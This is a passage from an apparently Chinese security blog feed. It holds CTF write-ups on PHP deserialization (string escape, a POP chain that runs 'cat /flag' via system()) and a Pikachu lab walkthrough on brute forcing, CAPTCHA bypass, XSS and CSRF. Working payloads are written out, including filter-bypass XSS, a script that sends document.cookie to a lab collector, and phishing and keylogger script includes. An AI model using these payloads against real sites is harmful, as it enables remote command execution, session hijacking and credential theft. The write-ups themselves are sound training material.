class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))));</span><br></pre></td></tr></table></figure><p>有<code>str_replace</code>函数，这道题是php反序列化字符串逃逸增多问题</p><p>首先构造序列化字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;N;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;</span><br></pre></td></tr></table></figure><p>我们需要逃逸<code>s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;</code>，为了构造闭合，在前面添加<code>&quot;;</code></p><p>现在我们需要逃逸的是<code>&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;</code>，长度是24</p><p>因为bad替换成good增加一个字符，所以我们需要输入24个bad</p><p>同样，<code>&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code>29个字符</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231031230621719.png" alt="image-20231031230621719"></p><h3 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h3><h4 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br><span class="line">Fatal error: Uncaught <span class="built_in">Exception</span>: Nope in /<span class="keyword">var</span>/www/html/index.php:<span class="number">55</span> Stack trace: <span class="comment">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 55</span></span><br></pre></td></tr></table></figure><h4 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h4><p>主要是<code>Fast destruct</code></p><p><em>1、PHP中，如果单独执行unserialize函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</em></p><p><em>2、PHP中，如果用一个变量接住反序列化函数的返回值，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，那么在PHP脚本走完流程之后，这个对象才会被销毁，在有析构函数的情况下就会将其执行。</em></p><p><a href="https://wh1tecell.top/2021/11/11/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8Bfast-destruct/">从一道题看fast_destruct</a></p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>首先构造pop链</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&#x27;cat /fl*&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;errMsg = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;errMsg-&gt;obj = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;errMsg-&gt;obj-&gt;func = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;errMsg-&gt;obj-&gt;func-&gt;obj = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:8:&quot;cat /fl*&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>传进去回显一个报错</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231101202055155.png" alt="image-20231101202055155"></p><p>这时候我们需要快速触发__destruct</p><p>姿势一：</p><p>修改序列化属性个数，1-&gt;2，类似__wakeup的绕过</p><p>姿势二：</p><p>去掉生成的序列化字符串最后的一个大括号</p>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场</title>
      <link href="/post/ecb6de2c.html"/>
      <url>/post/ecb6de2c.html</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>挂上代理，抓包，选择clusterbomb模式，设置两个payload</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720143541566.png" alt="image-20230720143541566"></p><p>分别将字典导入payload1和payload2，开始爆破</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144032127.png" alt="image-20230720144032127"></p><p>admin和123456登录成功</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144158701.png" alt="image-20230720144158701"></p><h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h3><p>输入用户名，密码，验证码进行抓包</p><p>发送到重放器发现，只更改用户名和密码，页面显示</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144826758.png" alt="image-20230720144826758"></p><p>再尝试改一下验证码，发现验证码错误</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144952690.png" alt="image-20230720144952690"></p><p>猜测一个验证码可以进行多次登录，直接将用户名和密码作为payload位置就可以</p><h4 id="原理，源码"><a href="#原理，源码" class="headerlink" title="原理，源码"></a>原理，源码</h4><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720145550989.png" alt="image-20230720145550989"></p><h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h3><p>根据提示，查看js代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> code; <span class="comment">//在全局 定义验证码</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">createCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">        code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> codeLength = <span class="number">5</span>;<span class="comment">//验证码的长度</span></span><br><span class="line">        <span class="keyword">var</span> checkCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;checkCode&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> selectChar = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>);<span class="comment">//所有候选组成验证码的字符，当然也可以用中文的</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; codeLength; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> charIndex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">36</span>);</span><br><span class="line">            code += selectChar[charIndex];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//alert(code);</span></span><br><span class="line">        <span class="keyword">if</span> (checkCode) &#123;</span><br><span class="line">            checkCode.<span class="property">className</span> = <span class="string">&quot;code&quot;</span>;</span><br><span class="line">            checkCode.<span class="property">value</span> = code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> inputCode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#bf_client .vcode&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">if</span> (inputCode.<span class="property">length</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;请输入验证码！&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inputCode != code) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;验证码输入错误！&quot;</span>);</span><br><span class="line">            <span class="title function_">createCode</span>();<span class="comment">//刷新验证码</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">createCode</span>();</span><br></pre></td></tr></table></figure><p>我们可以发现验证码是JavaScript随机生成，点击一次函数运行一次生成一个相应的验证码。</p><p>将数据包发送到repeater，更改验证码进行发包依旧提示<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720150339335.png" alt="image-20230720150339335"></p><p>发现该验证码是javascript随机生成的，后台并没有进行校验，我们直接进行爆破就行了</p><h3 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h3><p>输入用户名，密码，发现每次发包token就会更新一次</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720150804635.png" alt="image-20230720150804635"></p><p>在密码输入框的下方多一个隐藏的输入框，记录的是token的信息，那么直接拿去burp上开始爆破</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151146772.png" alt="image-20230720151146772"></p><p>模式选择 pitchfork 勾选两个参数，一个是密码，一个是token</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151403216.png" alt="image-20230720151403216"></p><p>token参数选择递归提取类型</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151756588.png" alt="image-20230720151756588"></p><p>点击选项找到<code>检索-提取</code>进行添加，先点击获得响应，再选中token，重定向选择为总是</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720152159863.png" alt="image-20230720152159863"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720151931006.png" alt="image-20230720151931006"></p><p>再将线程设置为单线程</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720152345438.png" alt="image-20230720152345438"></p><p>根据长度判断</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720152522273.png" alt="image-20230720152522273"></p><p> 爆破成功，得到admin的密码为123456</p><h2 id="跨站脚本攻击-xss"><a href="#跨站脚本攻击-xss" class="headerlink" title="跨站脚本攻击(xss)"></a>跨站脚本攻击(xss)</h2><h3 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h3><p>反射性，一次性的，刷新页面之后弹窗消失。GET是以url方式提交数据的。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">666</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230725194934531.png" alt="image-20230725194934531"></p><h3 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h3><p> POST是以表单方式在请求体里面提交</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230725195339871.png" alt="image-20230725195339871"></p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型和反射型漏洞形成的原因是一样的，而存储型xss可以将脚本保存到后台，造成更大的伤害，也成为永久永久型xss。</p><p>永久型的xss，刷新页面后弹窗依旧存在</p><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>这里是标签的href属性，直接javascript伪协议</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(6)</span><br></pre></td></tr></table></figure><p>出现弹窗</p><h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><p>查看源码</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230726151924912.png" alt="image-20230726151924912"></p><p>发现还是href属性，构造一个闭合或使用javascript伪协议</p><h3 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h3><p>我们直接在输入框里插js代码，后端有漏洞就就可以<code>x</code>成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>登录后台账号，发现被弹</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729132816754.png" alt="image-20230729132816754"></p><h3 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h3><p>绕过方法</p><p>前端有过滤的，可以直接修改前端代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//大小写绕过</span><br><span class="line">&lt;sCRipt&gt;aLErt(&quot;xss&quot;)&lt;?/ScRipT&gt;</span><br><span class="line">//拼凑绕过</span><br><span class="line">&lt;scri &lt;script &gt;pt&gt;alert(&quot;xss&quot;)&lt;/scri &lt;/script&gt; pt&gt;</span><br><span class="line">//编码绕过</span><br><span class="line">&lt;img src=c onerror=&quot;alert(&quot;xss&quot;)&quot;/&gt; //img标签</span><br><span class="line">//html编码</span><br><span class="line">&lt;img src=c onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&quot;&gt; </span><br></pre></td></tr></table></figure><p>输入<code>&lt;script&gt;&quot;:#&#39;@</code></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729144851237.png" alt="image-20230729144851237"></p><p>应该是script被过滤了，大小写进行绕过</p><h3 id="xss之htmlspecialchars-函数"><a href="#xss之htmlspecialchars-函数" class="headerlink" title="xss之htmlspecialchars()函数"></a>xss之htmlspecialchars()函数</h3><p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p><p>它可以将字符串中的特殊字符（如&lt;&gt;等）转换为了HTML实体，以防止跨站点脚本攻击（XSS）</p><p>输入<code>6666;&quot;&#39;&lt;&gt;</code>,查看源码，发现只有单引号<code>&#39;</code>没有被编码</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729184054693.png" alt="image-20230729184054693"></p><p>我们可以构造一个闭合，<code>&#39; onclick=&#39;alert(666)&#39;</code>,也可以输入<code>javascript:alert(666)</code></p><h3 id="xss之href输出和js输出"><a href="#xss之href输出和js输出" class="headerlink" title="xss之href输出和js输出"></a>xss之href输出和js输出</h3><p>输入<code>javascript:alert(666)</code></p><p>js输出的源码</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729184822985.png" alt="image-20230729184822985"></p><p>构造闭合<code>&#39;&lt;/script&gt;&lt;script&gt;alert(666)&lt;/script&gt;</code></p><h3 id="xss的危害"><a href="#xss的危害" class="headerlink" title="xss的危害"></a>xss的危害</h3><h4 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h4><p>我们利用pikachu的xss后台获取cookie</p><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location = &#x27;http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27; +document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>将他输入反射型xss中，打开后台</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729190509558.png" alt="image-20230729190509558"></p><h4 id="钓鱼获取账户密码"><a href="#钓鱼获取账户密码" class="headerlink" title="钓鱼获取账户密码"></a>钓鱼获取账户密码</h4><p>嵌入代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/xfish/fish.php&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>会弹出一个登录框</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729191017804.png" alt="image-20230729191017804"></p><p>我们输入账号密码，数据会存到后台可以进行查看</p><h4 id="获取键盘记录"><a href="#获取键盘记录" class="headerlink" title="获取键盘记录"></a>获取键盘记录</h4><p>同源策略规定，两个不同域名之间不能使用JS进行相互操作。</p><p>所以我们需要允许跨域访问</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729201339674.png" alt="image-20230729201339674"></p><p>嵌入代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1/pikachu/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>打开控制台，在页面随便敲键盘，在后台可以看到输入数据</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230729201539875.png" alt="image-20230729201539875"></p><h2 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>CSRF的攻击场景中攻击者会伪造一个请求(这个请求一般是一 个链接)，<br> 然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击也就完成了。</p><p>csrf攻击前，首先需要用户的权限，再诱导用户再点击这个请求完成攻击。</p><p>csrf是借用用户的权限进行攻击，xss是直接盗用用户的身份在进行攻击。</p><h3 id="CSRF-get-x2F-post"><a href="#CSRF-get-x2F-post" class="headerlink" title="CSRF(get&#x2F;post)"></a>CSRF(get&#x2F;post)</h3><p>GET型</p><p>进入修改信息的界面，提交修改信息的请求会在url中体现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=&amp;add=&amp;email=&amp;submit=submit</span><br></pre></td></tr></table></figure><p>我们在url中直接修改参数就可以了</p><p>POST型</p><p>post型是通过表单进行请求</p><p>我们可以利用bp抓包工具生成一个csrf poc</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200210267.png" alt="image-20230731200210267"></p><p><img 